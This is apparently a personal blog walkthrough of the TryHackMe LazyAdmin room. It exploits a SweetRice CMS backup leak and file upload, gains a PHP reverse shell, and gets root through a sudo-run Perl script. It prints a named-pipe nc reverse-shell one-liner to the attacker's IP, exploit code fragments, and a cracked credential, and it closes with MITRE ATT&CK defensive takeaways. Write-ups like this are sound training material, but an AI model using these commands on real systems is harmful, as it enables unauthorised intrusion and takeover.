---
title: "LazyAdmin TryHackMe Walkthrough"
layout: single
classes: wide
author_profile: true
read_time: true
comments: true
share: true
related: true
description: "A complete walkthrough of the LazyAdmin room on TryHackMe, demonstrating enumeration, exploitation, and privilege escalation on a Linux system running SweetRice CMS."
tags: [TryHackMe, CTF, Walkthrough, Privilege Escalation, Web Exploits, Reverse Shell, Enumeration, Cybersecurity]
categories: 
  - TryHackMe
  - CTF Walkthroughs
  - Linux Exploitation
  - Web Application Security
keywords: ["LazyAdmin walkthrough", "TryHackMe LazyAdmin", "SweetRice CMS exploit", "Privilege escalation", "CTF root flag", "web shell exploit", "Linux reverse shell", "named pipe reverse shell", "exploit-db 40716", "exploit-db 40718"]
toc: true
toc_sticky: true
header:
  overlay_image: /assets/images/thm/ctf/lazyadmin-hero.jpg
  overlay_filter: 0.3
  caption: "Pwned the LazyAdmin machine on TryHackMe"
---

> This walkthrough is written as a narrative guide based on my step-by-step discovery process while working through the [LazyAdmin room on TryHackMe](https://tryhackme.com/room/lazyadmin). Each section includes the exact commands, screenshots, and my thought process as I moved from enumeration to privilege escalation.

## Initial Enumeration

I kicked things off with an aggressive all-port scan:

```bash
nmap -p- -T4 -A 10.10.95.27
```

<img src="assets/images/thm/ctf/lazyadmin-02.png" alt="Nmap Scan Results for LazyAdmin" style="max-width:100%; height:auto;">

Discovered open ports:
- 22 (SSH)
- 80 (HTTP)

Navigating to the index page on port 80 revealed the default Apache2 Ubuntu landing page:

<img src="assets/images/thm/ctf/lazyadmin-03.png" alt="Default Apache2 Page" style="max-width:100%; height:auto;">

## Web Enumeration

Next, I checked for a `robots.txt` file at `http://10.10.95.27/robots.txt`, which resulted in a "Not Found" error. However, the Apache version `Apache/2.4.18` was disclosed:

<img src="assets/images/thm/ctf/lazyadmin-04.png" alt="robots.txt not found" style="max-width:100%; height:auto;">

### Directory Busting

I used `ffuf` to search for hidden directories:

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u 'http://10.10.202.51:80/FUZZ'
```

<img src="assets/images/thm/ctf/lazyadmin-05.png" alt="FFuF Directory Discovery" style="max-width:100%; height:auto;">

To confirm, I also used `dirsearch`:

<img src="assets/images/thm/ctf/lazyadmin-06.png" alt="Dirsearch Result" style="max-width:100%; height:auto;">

Navigating to `/content/`, I encountered a CMS admin placeholder page:

<img src="assets/images/thm/ctf/lazyadmin-07.png" alt="SweetRice CMS Placeholder" style="max-width:100%; height:auto;">

The page source contained nothing interesting:

<img src="assets/images/thm/ctf/lazyadmin-09.png" alt="Page Source Inspection" style="max-width:100%; height:auto;">

I also checked `/server-status`, which returned a 403 Forbidden message:

<img src="assets/images/thm/ctf/lazyadmin-10.png" alt="Forbidden server-status" style="max-width:100%; height:auto;">

## Vulnerability Research

At this point, I identified the CMS as **SweetRice** and looked for public exploits. I came across two notable ones for version 1.5.1:

- **Exploit-DB 40718 - SweetRice Backup Disclosure**
- **Exploit-DB 40716 - SweetRice Arbitrary File Upload**

<img src="assets/images/thm/ctf/lazyadmin-11.png" alt="Exploit Search Results" style="max-width:100%; height:auto;">

### Backup Disclosure Exploit

From the exploit PoC:

```
Proof of Concept :

You can access to all mysql backup and download them from this directory.
http://localhost/inc/mysql_backup

and can access to website files backup from:
http://localhost/SweetRice-transfer.zip
```

I browsed to:

```
http://10.10.95.27/content/inc/mysql_backup/
```

<img src="assets/images/thm/ctf/lazyadmin-12.png" alt="MySQL Backup Directory" style="max-width:100%; height:auto;">

Inside, I downloaded the backup file and examined its contents:

<img src="assets/images/thm/ctf/lazyadmin-13.png" alt="Downloaded SQL Backup" style="max-width:100%; height:auto;">

Found this credential dump:

```
"manager"; "passwd"; "42f749ade7f9e195bf475f37a44cafcb"
```

Cracked it on CrackStation:

<img src="assets/images/thm/ctf/lazyadmin-14.png" alt="CrackStation Result" style="max-width:100%; height:auto;">

Password: `Password123`

### Arbitrary File Upload Exploit

The second exploit allowed authenticated users to upload arbitrary files:

```python
# SweetRice 1.5.1 - Unrestricted File Upload
host = input("Enter The Target URL : ")
username = input("Enter Username : ")
password = input("Enter Password : ")
filename = input("Enter FileName (e.g., shell.php5) : ")
file = {'upload[]': open(filename, 'rb')}
...
uploadfile = r.post('http://' + host + '/as/?type=media_center&mode=upload', files=file)
```

The exploit uploads the payload to:

```
http://<target>/attachment/<filename>
```

This led me to manually test `/content/as`, which showed the login form:

<img src="assets/images/thm/ctf/lazyadmin-16.png" style="max-width:100%; height:auto;">

Logged in successfully:

<img src="assets/images/thm/ctf/lazyadmin-17.png" style="max-width:100%; height:auto;">
<img src="assets/images/thm/ctf/lazyadmin-18.png" style="max-width:100%; height:auto;">

Navigated to Media Center:

<img src="assets/images/thm/ctf/lazyadmin-19.png" style="max-width:100%; height:auto;">

Created a `shell.php5` using PentestMonkey’s reverse shell:

<img src="assets/images/thm/ctf/lazyadmin-20.png" style="max-width:100%; height:auto;">

Started my listener:

```bash
nc -lvnp 7777
```

<img src="assets/images/thm/ctf/lazyadmin-21.png" style="max-width:100%; height:auto;">

Uploaded the file:

<img src="assets/images/thm/ctf/lazyadmin-22.png" style="max-width:100%; height:auto;">

Clicked to trigger it:

<img src="assets/images/thm/ctf/lazyadmin-23.png" style="max-width:100%; height:auto;">

## Foothold & Privilege Escalation

Initial enumeration revealed sudo permissions on a Perl script:

<img src="assets/images/thm/ctf/lazyadmin-24.png" style="max-width:100%; height:auto;">

Found `backup.pl`:

<img src="assets/images/thm/ctf/lazyadmin-25.png" style="max-width:100%; height:auto;">
<img src="assets/images/thm/ctf/lazyadmin-26.png" style="max-width:100%; height:auto;">

It executed `/etc/copy.sh` which contained a named pipe reverse shell:

<img src="assets/images/thm/ctf/lazyadmin-27.png" style="max-width:100%; height:auto;">

I replaced the script:

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.79.36 5554 >/tmp/f" > /etc/copy.sh
```

<img src="assets/images/thm/ctf/lazyadmin-28.png" style="max-width:100%; height:auto;">

Started a new listener:

<img src="assets/images/thm/ctf/lazyadmin-29.png" style="max-width:100%; height:auto;">

Executed backup.pl:

```bash
sudo perl /home/itguy/backup.pl
```

<img src="assets/images/thm/ctf/lazyadmin-30.png" style="max-width:100%; height:auto;">

## Defensive Takeaways (MITRE ATT&CK-Informed)

```yaml
Initial Access:
  Technique: T1190 - Exploit Public-Facing Application
  Description: Exploiting SweetRice file upload vulnerability.
  Mitigations:
    - M1050: Exploit Protection
    - M1049: Antivirus/Antimalware

Credential Access:
  Technique: T1555 - Credentials from Password Stores
  Description: SQL backup disclosed credentials.
  Mitigations:
    - M1027: Password Policies
    - M1054: Software Configuration

Execution:
  Technique: T1059.004 - Unix Shell
  Description: Remote shell via PHP and Perl scripts.
  Mitigations:
    - M1038: Execution Prevention
    - M1047: Audit Scripting

Privilege Escalation:
  Technique: T1548.001 - Abuse Elevation Control Mechanism: Sudo
  Description: Gained root via Perl script calling a modifiable shell script.
  Mitigations:
    - M1026: Privileged Account Management
    - M1042: Disable unnecessary sudoers configurations
```

---

## Final Thoughts

LazyAdmin was a solid beginner box featuring:

- Sensitive file exposure
- SQL credential disclosure
- Arbitrary file upload
- Sudo misconfigurations

Each step mirrored real-world misconfigurations — definitely a must-try room.

Happy hacking! 🧠💻🔥
